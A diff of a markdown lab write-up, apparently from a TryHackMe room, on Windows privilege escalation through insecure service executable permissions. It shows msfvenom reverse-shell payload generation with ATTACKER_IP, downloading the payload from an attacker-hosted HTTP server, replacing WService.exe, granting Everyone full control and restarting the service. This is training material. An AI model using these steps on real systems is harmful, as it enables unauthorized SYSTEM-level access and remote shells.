@@ -2,17 +2,17 @@
 sidebar_position: 1
 ---
 
-# Insecure Permissions [Service]
+# Insecure Permissions
 
 - <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service has <span style={{fontWeight: 'Bold'}}>Weak Permissions</span> that allows the Modification - Replacement. It is possible to gain the Privileges of the Service.
 
 - **The Service runs as User:** `svcusr1`
 
 ```log
-C:\> sc qc WindowsScheduler
+C:\> sc qc "WindowsScheduler"
 [SC] QueryServiceConfig SUCCESS
 
-SERVICE_NAME: windowsscheduler
+SERVICE_NAME: WindowsScheduler
         TYPE               : 10  WIN32_OWN_PROCESS
         START_TYPE         : 2   AUTO_START
         ERROR_CONTROL      : 0   IGNORE
@@ -29,8 +29,7 @@ SERVICE_NAME: windowsscheduler
 - Group <b style={{ color: 'DeepSkyBlue' }}>Everyone:(I)(M)</b> has <span style={{fontWeight: 'Bold'}}>Modify</span> Permissions on the Service Executable.
 
 ```log
-C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
-// highlight-next-line
+C:\Users\thm-unpriv> icacls C:\PROGRA~2\SYSTEM~1\WService.exe
 C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                   NT AUTHORITY\SYSTEM:(I)(F)
                                   BUILTIN\Administrators:(I)(F)
@@ -42,18 +41,10 @@ C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
 <br/>
 <br/>
 
-- Generating the **PAYLOAD** and **HOSTING** using Simple Python Server.
+- Generating and Transfering the **PAYLOAD**
 
-```log
-attacker@machine:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
-attacker@machine:~$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-
-- Downloading the Executable on the **Target Machine.**
-
-```bash
-C:\> wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
+```js
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe-service -o rev-svc.exe
 ```
 
 <br/>
@@ -62,7 +53,6 @@ C:\> wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
 - We need another User to execute the **PAYLOAD**, so we grant Full Permission to the **Everyone Group:** <b style={{ color: 'DeepSkyBlue' }}>Everyone:(F)</b>
 
 ```powershell
-C:\> cd C:\PROGRA~2\SYSTEM~1\
 C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
 C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
 C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
@@ -74,8 +64,8 @@ C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
 - Restarting the <b style={{ color: 'MediumTurquoise' }}>WindowsScheduler</b> Service. <span style={{fontWeight: 'Bold'}}>(In a Normal case Scenario we would have to Wait for a Service Restart)</span>
 
 ```log
-C:\> sc stop  "windowsscheduler"
-C:\> sc start "windowsscheduler"
+C:\> sc stop  "WindowsScheduler"
+C:\> sc start "WindowsScheduler"
 ```
 
 ```bash
